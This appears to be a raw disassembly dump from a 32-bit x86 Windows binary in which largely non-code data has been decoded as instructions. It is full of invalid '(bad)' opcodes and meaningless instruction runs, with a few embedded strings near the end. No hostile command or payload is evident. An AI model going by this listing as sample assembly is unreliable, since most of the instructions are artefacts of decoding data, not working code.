  423178:	xor    DWORD PTR [ebp-0xa022cc1],ebx
  42317e:	sub    BYTE PTR [edx],ch
	...
  42318c:	add    BYTE PTR [eax],al
  42318e:	xchg   ebx,eax
  42318f:	cmp    DWORD PTR [ebp-0x2c814294],0xffffffff
  423196:	push   eax
  423197:	loopne 0x423193
  423199:	call   0xdd77:0xb1406784
  4231a0:	add    DWORD PTR [eax],eax
  4231a2:	pop    edx
  4231a3:	add    BYTE PTR [eax],al
  4231a5:	add    ch,dh
  4231a7:	xor    ah,dl
  4231a9:	jle    0x4231c4
  4231ab:	ja     0x423164
  4231ad:	xor    edi,DWORD PTR [ebp+0x2d]
  4231b0:	fmul   QWORD PTR [esi-0x6ebfc7a5]
  4231b6:	enter  0x4b40,0x6f
  4231ba:	test   eax,0x58d0e866
  4231bf:	cmp    eax,0x274611ef
  4231c4:	sti    
  4231c5:	or     bh,dl
  4231c7:	data16 (bad) 
  4231ca:	out    0x4f,eax
  4231cc:	push   esp
  4231cd:	xchg   BYTE PTR [eax],bh
  4231cf:	call   FWORD PTR [ebx+0x4c]
  4231d2:	mov    edi,0xfadc4b9d
  4231d7:	xor    DWORD PTR [ecx+ebx*1+0x41],0x13
  4231dc:	jmp    0x5d807e20
  4231e1:	pop    eax
  4231e2:	xlat   BYTE PTR ds:[ebx]
  4231e3:	(bad)  
  4231e4:	call   0x4ab40d0c
  4231e9:	pop    es
  4231ea:	(bad)
  4231ed:	sub    ebp,DWORD PTR [edx-0x70c36654]
  4231f3:	mov    esp,0x5649dc0c
  4231f8:	and    DWORD PTR [ebx-0x3db53b93],edx
  4231fe:	inc    eax
  4231ff:	xchg   BYTE PTR [eax],al
	...
  42320d:	add    ah,bl
  42320f:	fincstp 
  423211:	shl    bh,0xee
  423214:	(bad)  
  423215:	frstor [ecx+eax*1]
  423218:	pop    ebp
  423219:	dec    edi
  42321a:	aas    
  42321b:	jnp    0x423249
  42321d:	sahf   
  42321e:	rcr    ebp,1
  423220:	add    DWORD PTR [eax],eax
  423222:	pop    edx
  423223:	add    BYTE PTR [eax],al
  423225:	add    BYTE PTR [eax-0x22d51650],ch
  42322b:	scas   eax,DWORD PTR es:[edi]
  42322c:	or     DWORD PTR [edx],ebx
  42322e:	loope  0x4231d0
  423230:	cmp    ch,BYTE PTR [eax-0xb]
  423233:	(bad)  
  423234:	iret   
  423235:	push   esp
  423236:	out    0xa9,al
  423238:	mov    bh,0x4f
  42323a:	xlat   BYTE PTR ds:[ebx]
  42323b:	push   ebp
  42323c:	add    BYTE PTR [ecx+ebx*4-0x123461d2],0x26
  423244:	push   edx
  423245:	add    al,dh
  423247:	jns    0x423242
  423249:	and    DWORD PTR [esi-0x191eb41b],esp
  42324f:	scas   al,BYTE PTR es:[edi]
  423250:	push   esp
  423251:	fwait
  423252:	mov    al,ds:0x37affec5
  423257:	xchg   BYTE PTR [ebp-0x46c36019],dl
  42325d:	int3   
  42325e:	lea    eax,[ebx+eax*1]
  423261:	and    DWORD PTR [esi-0xf],edx
  423264:	addr16 xchg esi,eax
  423266:	inc    edi
  423267:	dec    edx
  423268:	mov    eax,0xd08875a1
  42326d:	in     al,0xb0
  42326f:	add    DWORD PTR [ecx],ebx
  423271:	sub    DWORD PTR [ebp+0xa456adc],ebp
  423277:	data16 loopne 0x4232ae
  42327a:	(bad)  
  42327c:	fwait
  42327d:	or     esi,DWORD PTR [eax]
  42327f:	mov    ds:0x0,al
	...
  42328c:	add    BYTE PTR [eax],al
  42328e:	outs   dx,DWORD PTR ds:[esi]
  42328f:	mov    ds:0x7edd2ad4,al
  423294:	jmp    edi
  423296:	push   edx
  423297:	fcmovu st,st(5)
  423299:	in     eax,0x18
  42329b:	mov    ebp,0xde2b8fe2
  4232a0:	add    DWORD PTR [eax],eax
  4232a2:	pop    edx
  4232a3:	add    BYTE PTR [eax],al
  4232a5:	add    BYTE PTR [edx],ah
  4232a7:	add    DWORD PTR ds:[ebx],esp
  4232aa:	fsub   QWORD PTR [edi]
  4232ac:	push   es
  4232ad:	adc    al,0xdd
  4232af:	sbb    eax,0x6f46a2b1
  4232b4:	push   ebx
  4232b5:	add    DWORD PTR [edi],esi
  4232b7:	fistp  DWORD PTR [eax+0x1bd6339d]
  4232bd:	jp     0x42326d
  4232bf:	mov    al,0x12
  4232c1:	mov    esp,ds
  4232c3:	loope  0x4232c0
  4232c5:	sbb    BYTE PTR [edi],0xf5
  4232c8:	(bad)  
  4232c9:	mov    bl,0xdd
  4232cb:	into   
  4232cc:	cmp    cl,BYTE PTR [edx+0x79]
  4232cf:	xor    eax,0x7977fdf7
  4232d4:	jmp    0xbd00:0xf982535b
  4232db:	mul    BYTE PTR [eax-0x3189a461]
  4232e1:	xchg   edi,eax
  4232e2:	and    eax,0xee7f5870
  4232e7:	mul    DWORD PTR [ebp+0x10b9454e]
  4232ed:	sbb    DWORD PTR [eax+esi*4+0x23963ef0],edi
  4232f4:	push   ebp
  4232f5:	or     dl,bl
  4232f7:	mov    ecx,0xe61c4d7d
  4232fc:	icebp  
  4232fd:	xchg   ecx,eax
  4232fe:	and    dh,al
	...
  42330c:	add    BYTE PTR [eax],al
  42330e:	stc    
  42330f:	sbb    al,al
  423311:	inc    esi
  423312:	jecxz  0x4232f2
  423314:	(bad)  
  423315:	mov    edi,0xe1f1bc83
  42331a:	aad    0x7d
  42331c:	cmp    BYTE PTR [eax-0x7b],0xde
  423320:	add    DWORD PTR [eax],eax
  423322:	pop    edx
  423323:	add    BYTE PTR [eax],al
  423325:	add    BYTE PTR [edi-0x35af6c1e],cl
  42332b:	add    edx,esi
  42332d:	mov    al,ds:0x5e1dd00e
  423332:	imul   edx,DWORD PTR [ebx],0xce546c9
  423338:	arpl   WORD PTR [ecx+0x69],cx
  42333b:	outs   dx,BYTE PTR ds:[esi]
  42333c:	outs   dx,BYTE PTR ds:[esi]
  42333d:	jae    0x4232db
  42333f:	dec    ecx
  423340:	cdq    
  423341:	pop    ebx
  423342:	jno    0x4233b7
  423344:	mov    WORD PTR [eax+edx*1+0x6a9fad0f],?
  42334b:	lock (bad) 
  42334d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42334e:	xchg   dl,dl
  423350:	sub    edx,DWORD PTR [ecx-0x900a0d7]
  423356:	popa   
  423357:	fist   WORD PTR [edi]
  423359:	mov    ebp,0xb535d063
  42335e:	out    0x15,al
  423360:	push   edi
  423361:	in     eax,0xe2
  423363:	addr16 dec edx
  423365:	fistp  DWORD PTR [edx+0x34]
  423368:	jne    0x4233d1
  42336a:	fdiv   DWORD PTR [ebx]
  42336c:	mov    edx,DWORD PTR [esi]
  42336e:	enter  0x6e63,0x87
  423372:	xor    DWORD PTR [ebx+0x1d],0x10
  423376:	repnz test BYTE PTR [ecx+0x463d3077],al
  42337d:	sub    BYTE PTR [edi+0xb8],0x0
	...
  42338c:	add    BYTE PTR [eax],al
  42338e:	mov    eax,ds:0x3e8336b9
  423393:	(bad)  
  423394:	mov    ch,0xbb
  423396:	icebp  
  423397:	and    eax,0x7a448c27
  42339c:	into   
  42339d:	imul   ebx,edi,0xffffffde
  4233a0:	add    DWORD PTR [eax],eax
  4233a2:	pop    edx
  4233a3:	add    BYTE PTR [eax],al
  4233a5:	add    bh,dh
  4233a7:	out    0x0,eax
  4233a9:	jns    0x4233fc
  4233ab:	mov    ebp,0xfeca4be2
  4233b0:	jecxz  0x4233b4
  4233b2:	ret    
  4233b3:	imul   dh
  4233b5:	outs   dx,DWORD PTR ds:[esi]
  4233b6:	(bad)
  4233ba:	(bad)  
  4233bb:	fisttp WORD PTR [esi]
  4233bd:	inc    esp
  4233be:	ins    DWORD PTR es:[edi],dx
  4233bf:	jae    0x4233a2
  4233c1:	push   0x581cc5cc
  4233c6:	ret    0xaa7e
  4233c9:	scas   al,BYTE PTR es:[edi]
  4233ca:	fcmovbe st,st(6)
  4233cc:	mov    dl,0xcc
  4233ce:	loop   0x4233a3
  4233d0:	xchg   DWORD PTR [esi],esp
  4233d2:	push   cs
  4233d3:	pushf  
  4233d4:	xchg   esi,eax
  4233d5:	stos   DWORD PTR es:[edi],eax
  4233d6:	call   0x5450:0x6760bd72
  4233dd:	sbb    edx,esp
  4233df:	sti    
  4233e0:	inc    esp
  4233e1:	ins    BYTE PTR es:[edi],dx
  4233e2:	cli    
  4233e3:	sub    DWORD PTR [ecx+0x4f],ebp
  4233e6:	popf   
  4233e7:	dec    edx
  4233e8:	sub    al,0x5c
  4233ea:	in     al,0x62
  4233ec:	adc    ebx,DWORD PTR [eax+0x153d13f8]
  4233f2:	jns    0x423418
  4233f4:	mov    al,0xb4
  4233f6:	jne    0x4233bc
  4233f8:	hlt    
  4233f9:	out    dx,eax
  4233fa:	addr16 mov eax,ds:0xe850
  4233fe:	ret    
  4233ff:	mov    WORD PTR [eax],es
	...
  42340d:	add    BYTE PTR [edx],dl
  42340f:	xlat   BYTE PTR ds:[ebx]
  423410:	repz or esi,edi
  423413:	das    
  423414:	cli    
  423415:	fist   WORD PTR [ecx]
  423417:	dec    ebx
  423418:	es nop
  42341a:	mov    bh,0xbd
  42341c:	aas    
  42341d:	push   0x1df39
  423422:	pop    edx
  423423:	add    BYTE PTR [eax],al
  423425:	add    ch,al
  423427:	jno    0x42348f
  423429:	jo     0x423407
  42342b:	call   DWORD PTR [edi]
  42342d:	arpl   WORD PTR [esi],sp
  42342f:	lods   al,BYTE PTR ds:[esi]
  423430:	adc    dl,BYTE PTR [eax*2-0x74b4ef33]
  423437:	mov    ebx,0x2fecbbd9
  42343c:	palignr mm7,QWORD PTR [ebx-0x63810e56],0x73
  423445:	mov    edi,0x9d2ac215
  42344a:	and    BYTE PTR [ecx],cl
  42344c:	stc    
  42344d:	out    dx,al
  42344e:	ret    0x3dd7
  423451:	lods   eax,DWORD PTR ds:[esi]
  423452:	xchg   edx,eax
  423453:	mov    esi,0x5b8e188b
  423458:	cmp    edi,DWORD PTR [edx+0x423902a]
  42345e:	lods   eax,DWORD PTR ds:[esi]
  42345f:	inc    ecx
  423460:	lock sbb al,0x87
  423463:	retf   0xe1e9
  423466:	rcl    BYTE PTR [edx-0x510522c0],0xf1
  42346d:	sub    eax,0x2fa2c492
  423472:	mov    ebx,0xaf9c949c
  423477:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423478:	dec    esi
  423479:	adc    eax,0x126c4625
  42347e:	mov    ah,0xe7
	...
  42348c:	add    BYTE PTR [eax],al
  42348e:	adc    bh,BYTE PTR [edx-0x19073928]
  423494:	push   ds
  423495:	(bad)  
  423496:	adc    bl,dh
  423498:	cwde   
  423499:	out    dx,al
  42349a:	shl    DWORD PTR cs:[edx-0x6e],0x93
  42349f:	fild   WORD PTR [ecx]
  4234a1:	add    BYTE PTR [edx+0x0],bl
  4234a4:	add    BYTE PTR [eax],al
  4234a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4234a7:	pop    ecx
  4234a8:	dec    ebx
  4234a9:	pop    ds
  4234aa:	jo     0x4234ff
  4234ac:	inc    edi
  4234ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4234ae:	xchg   edx,eax
  4234af:	sbb    al,0xaf
  4234b1:	or     ebx,ecx
  4234b3:	add    edx,ebx
  4234b5:	mov    ecx,0xd8daf2b8
  4234ba:	out    0x79,al
  4234bc:	scas   eax,DWORD PTR es:[edi]
  4234bd:	cmp    ch,BYTE PTR [ebp+0x61bb2b48]
  4234c3:	cmp    eax,0x303ef760
  4234c8:	jecxz  0x4234ae
  4234ca:	xor    eax,0xa20eb5b4
  4234cf:	add    cl,0x9d
  4234d2:	cmp    DWORD PTR [ebp-0x1692dd1f],eax
  4234d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4234d9:	mov    ch,0x8f
  4234db:	mov    al,0xda
  4234dd:	mov    ecx,0x70f82596
  4234e2:	jp     0x423487
  4234e4:	mov    bh,0x74
  4234e6:	or     dh,BYTE PTR [ebx]
  4234e8:	iret   
  4234e9:	ins    BYTE PTR es:[edi],dx
  4234ea:	mov    dh,0x9b
  4234ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4234ed:	es pop ebp
  4234ef:	pop    es
  4234f0:	dec    ecx
  4234f1:	nop
  4234f2:	and    DWORD PTR [ebp-0x50aeb6eb],ecx
  4234f8:	sbb    eax,0x81114326
  4234fd:	adc    edi,DWORD PTR [eax+0x1b]
	...
  42350c:	add    BYTE PTR [eax],al
  42350e:	add    al,al
  423510:	inc    edx
  423511:	add    BYTE PTR [eax+eax*8],al
  423514:	inc    edx
  423515:	add    BYTE PTR [eax],cl
  423517:	rol    BYTE PTR [edx+0x0],0xc
  42351b:	rol    BYTE PTR [edx+0x0],0x10
  42351f:	rol    BYTE PTR [edx+0x0],0x14
  423523:	rol    BYTE PTR [edx+0x0],0x18
  423527:	rol    BYTE PTR [edx+0x0],0x1c
  42352b:	rol    BYTE PTR [edx+0x0],0x57
  42352f:	inc    edi
  423530:	cmp    DWORD PTR [edi+0x41],ebx
  423533:	pop    eax
  423534:	ss push esi
  423536:	pop    edi
  423537:	cmp    BYTE PTR [eax],al
  423539:	inc    ebx
  42353a:	inc    ebp
  42353b:	dec    esp
  42353c:	pop    edi
  42353d:	pop    eax
  42353e:	push   edi
  42353f:	dec    eax
  423540:	inc    edx
  423541:	add    BYTE PTR [edi+0x50],dl
  423544:	xor    eax,0x4641365f
  423549:	cmp    DWORD PTR [edx],esi
  42354b:	xor    ebx,DWORD PTR [edi+0x32]
  42354e:	aaa    
  42354f:	add    BYTE PTR [eax+0x48],dl
  423552:	xor    BYTE PTR [edi+0x58],bl
  423555:	push   esp
  423556:	inc    ecx
  423557:	dec    ebp
  423558:	push   ecx
  423559:	pop    edi
  42355a:	inc    esi
  42355b:	push   ebp
  42355c:	cmp    DWORD PTR [eax],eax
  42355e:	push   edi
  42355f:	push   ebp
  423560:	inc    ecx
  423561:	xor    dh,BYTE PTR [ebx]
  423563:	xor    ebx,DWORD PTR [edi+0x4e]
  423566:	add    BYTE PTR [esp+ecx*2+0x4d],dl
  42356a:	cmp    DWORD PTR [edi+0x38],ebx
  42356d:	dec    ecx
  42356e:	cmp    DWORD PTR [edx+0x36],ebx
  423571:	pop    edi
  423572:	dec    edx
  423573:	xor    BYTE PTR [edx+0x34],cl
  423576:	add    BYTE PTR [ecx+eax*2+0x34],cl
  42357a:	xor    esi,DWORD PTR [eax]
  42357c:	pop    edi
  42357d:	inc    edx
  42357e:	dec    ebx
  42357f:	pop    eax
  423580:	pop    eax
  423581:	xor    eax,0x51414d00
  423586:	pop    edi
  423587:	inc    ecx
  423588:	xor    al,BYTE PTR [ebp+0x5f]
  42358b:	inc    ecx
  42358c:	dec    ebx
  42358d:	cmp    DWORD PTR ds:0x5a003939,esi
  423593:	inc    ebp
  423594:	cmp    BYTE PTR [edi+0x4d],bl
  423597:	ss dec eax
  423599:	dec    ebx
  42359a:	add    BYTE PTR [ebp+0x57],al
  42359d:	xor    DWORD PTR [edi+0x31],ebx
  4235a0:	dec    ebx
  4235a1:	xor    eax,DWORD PTR [ecx+0x30]
  4235a4:	push   ebx
  4235a5:	add    BYTE PTR [edx+esi*1+0x36],al
  4235a9:	aaa    
  4235aa:	pop    edi
  4235ab:	push   edx
  4235ac:	dec    eax
  4235ad:	dec    ebp
  4235ae:	cmp    BYTE PTR [edi+0x37],bl
  4235b1:	inc    esi
  4235b2:	xor    eax,0x43355500
  4235b7:	pop    edi
  4235b8:	pop    ecx
  4235b9:	dec    ecx
  4235ba:	push   ebx
  4235bb:	xor    bl,BYTE PTR [edi+0x52]
  4235be:	add    BYTE PTR [eax+0x55],dl
  4235c1:	dec    ecx
  4235c2:	xor    BYTE PTR [edi+0x43],bl
  4235c5:	ss inc ebp
  4235c7:	xor    bl,BYTE PTR [edi+0x4d]
  4235ca:	xor    al,0x4a
  4235cc:	push   edx
  4235cd:	push   ebp
  4235ce:	add    BYTE PTR [esi+0x39],cl
  4235d1:	push   eax
  4235d2:	pop    edi
  4235d3:	push   ebp
  4235d4:	cmp    DWORD PTR [esi],esi
  4235d6:	xor    BYTE PTR [ecx],dh
  4235d8:	pop    edi
  4235d9:	dec    edi
  4235da:	dec    esi
  4235db:	push   esp
  4235dc:	cmp    BYTE PTR [eax],al
  4235de:	dec    esp
  4235df:	xor    al,0x44
  4235e1:	xor    DWORD PTR [edi+0x4b],ebx
  4235e4:	xor    DWORD PTR [ebp+0x5f],eax
  4235e7:	pop    edx
  4235e8:	add    BYTE PTR [edi+esi*1+0x43],dl
  4235ec:	pop    edi
  4235ed:	inc    edx
  4235ee:	xor    dh,BYTE PTR [ecx]
  4235f0:	push   ebx
  4235f1:	xor    DWORD PTR [ecx],edi
  4235f3:	inc    edx
  4235f4:	add    BYTE PTR [edi+0x45],al
  4235f7:	xor    al,0x38
  4235f9:	xor    BYTE PTR [eax],dh
  4235fb:	pop    edi
  4235fc:	dec    edx
  4235fd:	dec    ebx
  4235fe:	xor    eax,0x33345f4d
  423603:	add    BYTE PTR [ebx+esi*1+0x57],cl
  423607:	pop    edi
  423608:	aaa    
  423609:	push   esi
  42360a:	dec    ebx
  42360b:	push   edx
  42360c:	pop    edi
  42360d:	inc    ebx
  42360e:	add    BYTE PTR [edx+0x35],bl
  423611:	dec    ebp
  423612:	pop    edi
  423613:	inc    edi
  423614:	dec    esi
  423615:	xor    al,0x49
  423617:	xor    eax,0x54590035
  42361c:	push   edx
  42361d:	pop    edi
  42361e:	push   esp
  42361f:	inc    ebx
  423620:	inc    ecx
  423621:	pop    edi
  423622:	cmp    DWORD PTR [ecx+0x41],ebx
  423625:	push   ebp
  423626:	pop    edi
  423627:	push   ebp
  423628:	inc    ebp
  423629:	add    BYTE PTR [esi+esi*1+0x35],cl
  42362d:	pop    edi
  42362e:	pop    eax
  42362f:	dec    edx
  423630:	inc    edx
  423631:	inc    edi
  423632:	add    BYTE PTR [edx+0x36],al
  423635:	inc    ebx
  423636:	pop    edi
  423637:	xor    BYTE PTR ds:0x36464b,dh
  42363d:	dec    ebx
  42363e:	cmp    DWORD PTR [esi+0x37],eax
  423641:	xor    ebx,DWORD PTR [edi+0x35]
  423644:	ss inc edi
  423646:	pop    ecx
  423647:	dec    eax
  423648:	pop    ecx
  423649:	add    BYTE PTR [ebp+0x35],cl
  42364c:	push   eax
  42364d:	xor    BYTE PTR [edi+0x4f],bl
  423650:	pop    ecx
  423651:	xor    cl,BYTE PTR [edi+0x0]
  423654:	pop    ecx
  423655:	xor    DWORD PTR [esi+0x5f],ecx
  423658:	xor    al,BYTE PTR [edx+0x30]
  42365b:	push   esi
  42365c:	push   esp
  42365d:	inc    ebp
  42365e:	add    BYTE PTR [edi+0x37],al
  423661:	push   esi
  423662:	xor    DWORD PTR [edi+0x49],ebx
  423665:	xor    al,BYTE PTR [esi+0x30]
  423668:	pop    edi
  423669:	ss dec esi
  42366b:	cmp    BYTE PTR [eax],al
  42366d:	pop    edx
  42366e:	xor    eax,0x445f334b
  423673:	xor    BYTE PTR [eax],bh
  423675:	push   ecx
  423676:	push   esi
  423677:	xor    al,0x0
  423679:	push   ebp
  42367a:	pop    eax
  42367b:	inc    edi
  42367c:	xor    DWORD PTR [edi+0x39],ebx
  42367f:	push   esp
  423680:	inc    ebx
  423681:	aaa    
  423682:	inc    esp
  423683:	add    BYTE PTR [edi+0x39],dl
  423686:	ss pop edi
  423688:	dec    eax
  423689:	pop    edx
  42368a:	pop    ecx
  42368b:	inc    edi
  42368c:	push   ebp
  42368d:	pop    edi
  42368e:	push   eax
  42368f:	dec    eax
  423690:	inc    ebx
  423691:	add    BYTE PTR [ebp+0x0],dl
  423694:	xor    al,0x0
  423696:	dec    edi
  423697:	add    BYTE PTR [edi+0x0],bl
  42369a:	cmp    BYTE PTR [eax],al
  42369c:	xor    al,BYTE PTR [eax]
  42369e:	inc    ebx
  42369f:	add    BYTE PTR [edx+0x0],bl
  4236a2:	inc    ebx
  4236a3:	add    BYTE PTR [edi],dh
  4236a5:	add    BYTE PTR [edi+0x0],bl
  4236a8:	inc    ebx
  4236a9:	add    BYTE PTR [eax+eax*1+0x0],al
  4236ad:	add    BYTE PTR [eax+eax*1+0x4b],cl
  4236b1:	add    BYTE PTR [edx],dh
  4236b3:	add    BYTE PTR [edi+0x0],bl
  4236b6:	cmp    BYTE PTR [eax],al
  4236b8:	dec    esp
  4236b9:	add    BYTE PTR [esi+0x0],dl
  4236bc:	pop    edi
  4236bd:	add    BYTE PTR [ecx+0x0],bl
  4236c0:	push   edx
  4236c1:	add    BYTE PTR [esi+0x0],dl
  4236c4:	xor    al,BYTE PTR [eax]
  4236c6:	cmp    BYTE PTR [eax],al
  4236c8:	pop    edi
  4236c9:	add    BYTE PTR [edx+0x0],cl
  4236cc:	add    BYTE PTR [eax],al
  4236ce:	inc    edx
  4236cf:	add    BYTE PTR [eax+eax*1+0x46],cl
  4236d3:	add    BYTE PTR [edi+0x0],bl
  4236d6:	xor    eax,DWORD PTR [eax]
  4236d8:	inc    ebp
  4236d9:	add    BYTE PTR [ecx+0x0],cl
  4236dc:	push   edx
  4236dd:	add    BYTE PTR [ecx],bh
  4236df:	add    BYTE PTR [esi+0x0],dl
  4236e2:	add    BYTE PTR [eax],al
  4236e4:	dec    ebp
  4236e5:	add    BYTE PTR [edi],dh
  4236e7:	add    BYTE PTR [eax+eax*1+0x5f],al
  4236eb:	add    BYTE PTR [edx+0x0],cl
  4236ee:	pop    eax
  4236ef:	add    BYTE PTR [ebx],dh
  4236f1:	add    BYTE PTR [ecx],dh
  4236f3:	add    BYTE PTR [ebx+0x0],al
  4236f6:	add    BYTE PTR [eax],al
  4236f8:	dec    edi
  4236f9:	add    BYTE PTR [esi],dh
  4236fb:	add    BYTE PTR [eax+0x0],cl
  4236fe:	pop    edi
  4236ff:	add    BYTE PTR [eax],dh
  423701:	add    BYTE PTR [edi],dh
  423703:	add    BYTE PTR [ecx],dh
  423705:	add    BYTE PTR [edx+0x0],dl
  423708:	xor    eax,0x55000000
  42370d:	add    BYTE PTR [eax+eax*1+0x5a],dl
  423711:	add    BYTE PTR [edi+0x0],bl
  423714:	push   esp
  423715:	add    BYTE PTR [ecx+0x0],al
  423718:	cmp    DWORD PTR [eax],eax
  42371a:	pop    edi
  42371b:	add    BYTE PTR [ebx],dh
  42371d:	add    BYTE PTR [eax],dh
  42371f:	add    BYTE PTR [eax],bh
  423721:	add    BYTE PTR [edi+0x0],cl
  423724:	inc    ebx
  423725:	add    BYTE PTR ds:0x4d000000,dh
  42372b:	add    BYTE PTR [esi+0x0],cl
  42372e:	inc    ebp
  42372f:	add    BYTE PTR [edi+0x0],bl
  423732:	push   esp
  423733:	add    BYTE PTR [esi+0x0],al
  423736:	cmp    BYTE PTR [eax],al
  423738:	push   ebx
  423739:	add    BYTE PTR [edx+0x0],bl
  42373c:	pop    edi
  42373d:	add    BYTE PTR [eax],dh
  42373f:	add    BYTE PTR [eax],bh
  423741:	add    BYTE PTR [eax+0x0],cl
  423744:	add    BYTE PTR [eax],al
  423746:	dec    esi
  423747:	add    BYTE PTR [edi+0x0],cl
  42374a:	pop    edx
  42374b:	add    BYTE PTR [edi+0x0],bl
  42374e:	add    BYTE PTR ss:[ecx+0x0],bl
  423752:	dec    ebp
  423753:	add    BYTE PTR [esi],dh
  423755:	add    BYTE PTR [ebx],dh
  423757:	add    BYTE PTR [edi+0x0],bl
  42375a:	xor    al,0x0
  42375c:	dec    esi
  42375d:	add    BYTE PTR [edx],dh
  42375f:	add    BYTE PTR [esi],dh
  423761:	add    BYTE PTR [ecx],dh
  423763:	add    BYTE PTR [eax],al
  423765:	add    BYTE PTR [ebx+0x0],cl
  423768:	dec    eax
  423769:	add    BYTE PTR [eax],bh
  42376b:	add    BYTE PTR [edi+0x0],bl
  42376e:	inc    esi
  42376f:	add    BYTE PTR [esi+0x0],al
  423772:	push   esp
  423773:	add    BYTE PTR [edi],dh
  423775:	add    BYTE PTR [esi],dh
  423777:	add    BYTE PTR [edi+0x0],bl
  42377a:	dec    esp
  42377b:	add    BYTE PTR [ecx+0x0],bl
  42377e:	add    BYTE PTR [eax],al
  423780:	push   ebx
  423781:	add    BYTE PTR [ecx+0x0],bl
  423784:	xor    BYTE PTR [eax],al
  423786:	pop    edi
  423787:	add    BYTE PTR [ecx],bh
  423789:	add    BYTE PTR [edx+0x0],dl
  42378c:	dec    eax
  42378d:	add    BYTE PTR [ecx+0x0],bl
  423790:	xor    al,BYTE PTR [eax]
  423792:	pop    edi
  423793:	add    BYTE PTR [eax],dh
  423795:	add    BYTE PTR [eax],al
  423797:	add    BYTE PTR [edx+0x0],al
  42379a:	dec    edx
  42379b:	add    BYTE PTR [esi+0x0],cl
  42379e:	xor    al,BYTE PTR [eax]
  4237a0:	pop    edi
  4237a1:	add    BYTE PTR [eax+eax*1+0x33],cl
  4237a5:	add    BYTE PTR [edx+0x0],dl
  4237a8:	xor    al,0x0
  4237aa:	dec    eax
  4237ab:	add    BYTE PTR [eax],al
  4237ad:	add    BYTE PTR [ebp+0x0],dl
  4237b0:	add    BYTE PTR ss:[ebp+0x0],cl
  4237b4:	xor    DWORD PTR [eax],eax
  4237b6:	pop    edi
  4237b7:	add    BYTE PTR [esi],dh
  4237b9:	add    BYTE PTR [ecx+0x0],bl
  4237bc:	push   ebp
  4237bd:	add    BYTE PTR [eax+eax*1+0x5f],dl
  4237c1:	add    BYTE PTR [edi+0x0],cl
  4237c4:	inc    esp
  4237c5:	add    BYTE PTR [edi+0x0],dl
  4237c8:	push   ebx
  4237c9:	add    BYTE PTR [eax],al
  4237cb:	add    BYTE PTR [edx+0x0],bl
  4237ce:	inc    ebx
  4237cf:	add    BYTE PTR [ebp+0x0],dl
  4237d2:	pop    edi
  4237d3:	add    BYTE PTR [ecx],dh
  4237d5:	add    BYTE PTR [ebp+0x0],al
  4237d8:	push   esp
  4237d9:	add    BYTE PTR [eax],dh
  4237db:	add    BYTE PTR [eax],al
  4237dd:	add    BYTE PTR [eax],al
  4237df:	add    BYTE PTR [eax],al
  4237e1:	add    BYTE PTR [eax-0x7ffbffbe],al
  4237e7:	inc    edx
  4237e8:	add    BYTE PTR [eax],cl
  4237ea:	add    BYTE PTR [edx+0x0],0xc
  4237ee:	add    BYTE PTR [edx+0x0],0x10
  4237f2:	add    BYTE PTR [edx+0x0],0x14
  4237f6:	add    BYTE PTR [edx+0x0],0x18
  4237fa:	add    BYTE PTR [edx+0x0],0x1c
  4237fe:	add    BYTE PTR [edx+0x0],0x20
  423802:	add    BYTE PTR [edx+0x0],0x24
  423806:	add    BYTE PTR [edx+0x0],0x28
  42380a:	add    BYTE PTR [edx+0x0],0x0
  42380e:	add    BYTE PTR [eax],al
  423810:	add    BYTE PTR [eax],al
  423812:	add    BYTE PTR [eax],al
  423814:	xor    ebx,DWORD PTR [edi]
  423816:	ja     0x423865
  423818:	add    BYTE PTR [eax],al
  42381a:	add    BYTE PTR [eax],al
  42381c:	inc    edx
  42381d:	cmp    BYTE PTR [edx],al
  42381f:	add    BYTE PTR [ecx],al
  423821:	add    BYTE PTR [eax],al
  423823:	add    BYTE PTR [ecx],al
  423825:	add    BYTE PTR [eax],al
  423827:	add    BYTE PTR [ecx],al
  423829:	add    BYTE PTR [eax],al
  42382b:	add    BYTE PTR [eax],bh
  42382d:	cmp    BYTE PTR [edx],al
  42382f:	add    BYTE PTR [eax+edi*1],bh
  423832:	add    al,BYTE PTR [eax]
  423834:	inc    eax
  423835:	cmp    BYTE PTR [edx],al
  423837:	add    BYTE PTR [edi],ah
  423839:	mov    BYTE PTR [eax],al
  42383b:	add    BYTE PTR [esi+0x38],cl
  42383e:	add    al,BYTE PTR [eax]
  423840:	add    BYTE PTR [eax],al
  423842:	push   edi
  423843:	outs   dx,DWORD PTR ds:[esi]
  423844:	jb     0x4238aa
  423846:	push   edi
  423847:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  42384e:	aas    
  42384f:	inc    ebp
  423850:	outs   dx,BYTE PTR ds:[esi]
  423851:	jne    0x4238c0
  423853:	push   edi
  423854:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  42385b:	popa   
  42385c:	je     0x4238c7
  42385e:	outs   dx,DWORD PTR ds:[esi]
  42385f:	outs   dx,BYTE PTR ds:[esi]
  423860:	jae    0x4238b5
  423862:	je     0x4238c5
  423864:	.byte 0x74
